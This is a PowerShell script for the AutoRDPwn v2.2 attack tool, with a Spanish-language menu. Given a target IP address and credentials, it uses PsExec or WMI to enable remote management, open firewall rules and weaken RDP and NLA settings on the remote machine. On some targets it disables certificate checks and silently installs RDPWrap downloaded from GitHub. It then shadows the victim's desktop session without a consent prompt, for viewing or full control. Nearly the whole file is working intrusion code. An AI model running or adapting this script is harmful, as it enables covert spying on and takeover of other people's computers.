if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) { Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs; exit }

$Host.UI.RawUI.WindowTitle = "AutoRDPwn - v2.2 - by @JoelGMSec"
$Host.UI.RawUI.BackgroundColor = 'Black'
$Host.UI.RawUI.ForegroundColor = 'Gray'
$Host.PrivateData.ErrorForegroundColor = 'Red'
$Host.PrivateData.WarningForegroundColor = 'Magenta'
$Host.PrivateData.DebugForegroundColor = 'Yellow'
$Host.PrivateData.VerboseForegroundColor = 'Green'
$Host.PrivateData.ProgressForegroundColor = 'Cyan'
Clear-Host

function Show-Menu {

     Write-Host ""
     Write-Host "    _____         __       " -NoNewLine -ForegroundColor Magenta; Write-Host "___________________________ " -NoNewLine -ForegroundColor Blue; Write-Host "         v2.2  " -ForegroundColor Yellow
     Write-Host "   /  _  \  __ __|  |_ ____" -NoNewLine -ForegroundColor Magenta; Write-Host "\______   \______ \______  \" -NoNewLine -ForegroundColor Blue; Write-Host "_  _  _______  " -ForegroundColor Green
     Write-Host "  /  / \  \|  |  |   _| _  \" -NoNewLine -ForegroundColor Magenta; Write-Host "|       _/|     \ |    ___/" -NoNewLine -ForegroundColor Blue; Write-Host " \/ \/ /     \ " -ForegroundColor Green
     Write-Host " /  /___\  \  |  |  |  (_)  " -NoNewLine -ForegroundColor Magenta; Write-Host "|   |    \|_____/ |   |" -NoNewLine -ForegroundColor Blue; Write-Host " \        /   |   \" -ForegroundColor Green
     Write-Host " \  _____  /_____/__|\_____/" -NoNewLine -ForegroundColor Magenta; Write-Host "|___|__  /_______/|___|" -NoNewLine -ForegroundColor Blue; Write-Host "  \__/\__/|___|_  /" -ForegroundColor Green
     Write-Host "  \/     \/                 " -NoNewLine -ForegroundColor Magenta; Write-Host "       \/              " -NoNewLine -ForegroundColor Blue; Write-Host -NoNewLine "   by @JoelGMSec" -ForegroundColor Yellow; Write-Host "\/ " -ForegroundColor Green
     Write-Host "" 
     Write-Host "::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
     Write-Host "" 
     Write-Host "[1] - Lanzar el ataque a través de PsExec"
     Write-Host "[2] - Lanzar el ataque a través de WMI"
     Write-Host "[3] - Cerrar el programa"
     Write-Host "" }

Set-StrictMode -Version Latest
function ConvertFrom-SecureToPlain {
    
    param( [Parameter(Mandatory=$true)][System.Security.SecureString] $SecurePassword)
    $PasswordPointer = [Runtime.InteropServices.Marshal]::SecureStringToBSTR($SecurePassword)
    $PlainTextPassword = [Runtime.InteropServices.Marshal]::PtrToStringAuto($PasswordPointer)
    [Runtime.InteropServices.Marshal]::ZeroFreeBSTR($PasswordPointer)
    $PlainTextPassword }

    do { 
    Show-Menu
    $input = Read-Host "Elige la opción que más te interese"
    switch ($input) {
        '1' {
        Write-Host ""
        $input = Read-Host "El equipo es x86 o x64?"
        Write-Host ""
        switch ($input) {

            'x86' {
            $computer = Read-Host -Prompt 'Cuál es la IP del servidor?'
            Write-Host ""
            $user = Read-Host -Prompt 'Y el usuario?'
            Write-Host ""
            $password = Read-Host -AsSecureString -Prompt 'Escribe la contraseña'
            $Host.UI.RawUI.ForegroundColor = 'Cyan'
            Invoke-WebRequest -Uri "https://live.sysinternals.com/psexec.exe" -OutFile "psexec.exe" -UseBasicParsing
            $PlainTextPassword = ConvertFrom-SecureToPlain $password
            .\psexec.exe \\$computer -u $user -p $PlainTextPassword -h -d powershell.exe "winrm quickconfig -quiet; Enable-PSRemoting -Force; Set-NetConnectionProfile -InterfaceAlias "Ethernet*" -NetworkCategory Private; Set-NetConnectionProfile -InterfaceAlias "Wi-Fi*" -NetworkCategory Private" -accepteula
            .\psexec.exe \\$computer -u $user -p $PlainTextPassword -h -d powershell.exe netsh advfirewall firewall set rule name='Instrumental de administración de Windows (WMI de entrada)' new enable=yes ; netsh advfirewall firewall set rule group="Administración Remota de Windows" new enable=yes ; netsh advfirewall firewall set rule group="Detección de redes" new enable=Yes -accepteula
            .\psexec.exe \\$computer -u $user -p $PlainTextPassword -h -d powershell.exe netsh advfirewall firewall set rule group='Instrumental de Administración de Windows (WMI)' new enable=yes ; netsh advfirewall firewall set rule name='Administración remota de Windows (HTTP de entrada)' new enable=yes ; netsh advfirewall firewall set rule name='Administración remota de servicios (RPC)' new enable=yes -accepteula }

            'x64' {
            $computer = Read-Host -Prompt 'Cuál es la IP del servidor?'
            Write-Host ""
            $user = Read-Host -Prompt 'Y el usuario?'
            Write-Host ""
            $password = Read-Host -AsSecureString -Prompt 'Escribe la contraseña'
            $Host.UI.RawUI.ForegroundColor = 'Cyan'
            Invoke-WebRequest -Uri "https://live.sysinternals.com/PsExec64.exe" -OutFile "PsExec64.exe" -UseBasicParsing
            $PlainTextPassword = ConvertFrom-SecureToPlain $password
            .\PsExec64.exe \\$computer -u $user -p $PlainTextPassword -h -d powershell.exe "winrm quickconfig -quiet; Enable-PSRemoting -Force; Set-NetConnectionProfile -InterfaceAlias "Ethernet*" -NetworkCategory Private; Set-NetConnectionProfile -InterfaceAlias "Wi-Fi*" -NetworkCategory Private" -accepteula
            .\PsExec64.exe \\$computer -u $user -p $PlainTextPassword -h -d powershell.exe netsh advfirewall firewall set rule name='Instrumental de administración de Windows (WMI de entrada)' new enable=yes ; netsh advfirewall firewall set rule group="Administración Remota de Windows" new enable=yes ; netsh advfirewall firewall set rule group="Detección de redes" new enable=Yes -accepteula
            .\PsExec64.exe \\$computer -u $user -p $PlainTextPassword -h -d powershell.exe netsh advfirewall firewall set rule group="Instrumental de Administración de Windows (WMI)" ?new enable=yes ; netsh advfirewall firewall set rule name='Administración remota de Windows (HTTP de entrada)' new enable=yes ; netsh advfirewall firewall set rule name='Administración remota de servicios (RPC)' new enable=yes -accepteula }

            default {
            Write-Host "Opción incorrecta, vuelve a intentarlo de nuevo" -ForegroundColor Magenta; sleep -milliseconds 2500
            Clear-Host }}}

        '2' {
        Write-Host ""
        $computer = Read-Host -Prompt 'Cuál es la IP del servidor?'
        Write-Host ""
        $user = Read-Host -Prompt 'Y el usuario?'
        Write-Host ""
        $password = Read-Host -AsSecureString -Prompt 'Escribe la contraseña'
        Write-Host ""
        $Host.UI.RawUI.ForegroundColor = 'Cyan'
        $PlainTextPassword = ConvertFrom-SecureToPlain $password
        wmic /node:$computer /user:$user /password:$PlainTextPassword path win32_process call create "powershell.exe winrm quickconfig -quiet; Enable-PSRemoting -Force; Set-NetConnectionProfile -InterfaceAlias 'Ethernet*' -NetworkCategory Private; Set-NetConnectionProfile -InterfaceAlias 'Wi-Fi*' -NetworkCategory Private"
        wmic /node:$computer /user:$user /password:$PlainTextPassword path win32_process call create "powershell.exe netsh advfirewall firewall set rule name='Instrumental de administración de Windows (WMI de entrada)' new enable=yes ; netsh advfirewall firewall set rule group='Administración Remota de Windows' new enable=yes ; netsh advfirewall firewall set rule group='Detección de redes' new enable=Yes"
        wmic /node:$computer /user:$user /password:$PlainTextPassword path win32_process call create "powershell.exe netsh advfirewall firewall set rule group='Instrumental de Administración de Windows (WMI)' new enable=yes ; netsh advfirewall firewall set rule name='Administración remota de Windows (HTTP de entrada)' new enable=yes ; netsh advfirewall firewall set rule name='Administración remota de servicios (RPC)' new enable=yes" }

        '3' { exit }

        default {
        Write-Host ""
        Write-Host "Opción incorrecta, vuelve a intentarlo de nuevo" -ForegroundColor Magenta; sleep -milliseconds 2500
        Clear-Host }}
        
      } until ($input -in '1','x86','x64','2','3')

Write-Host ""
$Host.UI.RawUI.ForegroundColor = 'Yellow'
Set-NetConnectionProfile -InterfaceAlias "Ethernet*" -NetworkCategory Private; Set-NetConnectionProfile -InterfaceAlias "Wi-Fi*" -NetworkCategory Private
Set-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LocalAccountTokenFilterPolicy -Value 1 -Type DWord
winrm quickconfig -quiet; Set-Item wsman:\localhost\client\trustedhosts * -Force

   do { 
        Write-Host ""
        $Host.UI.RawUI.ForegroundColor = 'Gray'
        $input = Read-Host "Quieres ver o controlar el equipo?"
        $Host.UI.RawUI.ForegroundColor = 'Green'
        switch ($input) {

        'ver' {
        $control = "false"
        Write-Host ""
        REG DELETE "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /f
        Write-Host ""
        REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 4 }

        'controlar' {
        $control = "true"
        Write-Host ""
        REG DELETE "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /f
        Write-Host ""
        REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 2 }

        default {
        Write-Host "Opción incorrecta, vuelve a intentarlo de nuevo" -ForegroundColor Magenta; sleep -milliseconds 2500 }}

      } until ($input -in 'ver','controlar')

Write-Host ""
$cred= New-Object System.Management.Automation.PSCredential ("$user", $password )
$RDP = New-PSSession -Computer $computer -credential $cred

    invoke-command -session $RDP[0] -scriptblock {
    powershell Set-Executionpolicy UnRestricted
    REG DELETE "HKLM\SOFTWARE\Microsoft\WBEM\CIMOM" /v AllowAnonymousCallback /f
    REG ADD "HKLM\SOFTWARE\Microsoft\WBEM\CIMOM" /v AllowAnonymousCallback /t REG_DWORD /d 1
    REG DELETE "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v AllowRemoteRPC /f
    REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v AllowRemoteRPC /t REG_DWORD /d 1
    REG DELETE "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /f
    REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0
    Write-Host "Detectando versión del sistema operativo.." -ForegroundColor Magenta }

$version = invoke-command -session $RDP[0] -scriptblock {(systeminfo | findstr "Microsoft Windows" | select -First 1).split(':')[1].trim()}
$Host.UI.RawUI.ForegroundColor = 'Gray'

    if($version -Like '*Server*') {
        Write-Host ""
        Write-Host "$version detectado"
        invoke-command -session $RDP[0] -scriptblock {
        (Get-WmiObject -class Win32_TSGeneralSetting -Namespace root\cimv2\terminalservices -Filter "TerminalName='RDP-tcp'").SetUserAuthenticationRequired(0)
        Write-Host ""
        Write-Host "Buscando sesiones activas en el equipo.." -ForegroundColor Yellow
        Write-Host ""
        $Host.UI.RawUI.ForegroundColor = 'Gray'
        query session } 
        Write-Host ""
        $shadow = Read-Host -Prompt 'A qué sesión quieres conectarte?'
        if($control -eq 'true') { mstsc /v $computer /admin /shadow:$hadow /control /noconsentprompt /prompt /f }
        else { mstsc /v $computer /admin /shadow:$shadow /noconsentprompt /prompt /f }}

    else {
        Write-Host ""
        Write-Host "$version detectado, aplicando parche.."
        invoke-command -session $RDP[0] -scriptblock {
        add-type @"
        using System.Net;
        using System.Security.Cryptography.X509Certificates;
        public class TrustAllCertsPolicy : ICertificatePolicy {
        public bool CheckValidationResult(
        ServicePoint srvPoint, X509Certificate certificate,
        WebRequest request, int certificateProblem) {
        return true; }}

"@
$AllProtocols = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'
[System.Net.ServicePointManager]::SecurityProtocol = $AllProtocols
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy }

    invoke-command -session $RDP[0] -scriptblock {
    Invoke-WebRequest -Uri "https://github.com/stascorp/rdpwrap/releases/download/v1.6.2/RDPWInst-v1.6.2.msi" -OutFile "RDPWInst-v1.6.2.msi" -UseBasicParsing
    msiexec /i "RDPWInst-v1.6.2.msi" /quiet /qn /norestart 
    Write-Host ""
    netsh advfirewall firewall add rule name="Agente de sesión de RDP" dir=in protocol=udp action=allow program="C:\Windows\System32\rdpsa.exe" enable=yes
    netsh advfirewall firewall add rule name="Agente de sesión de RDP" dir=in protocol=tcp action=allow program="C:\Windows\System32\rdpsa.exe" enable=yes
    sleep -milliseconds 7500; rm .\RDPWInst-v1.6.2.msi 2> $null }
    if($control -eq 'true') { mstsc /v $computer /admin /shadow:1 /control /noconsentprompt /prompt /f }
    else { mstsc /v $computer /admin /shadow:1 /noconsentprompt /prompt /f }}

rm .\psexec.exe, .\PsExec64.exe 2> $null
Write-Host "Iniciando conexión remota.." -ForegroundColor Yellow; sleep -milliseconds 2500
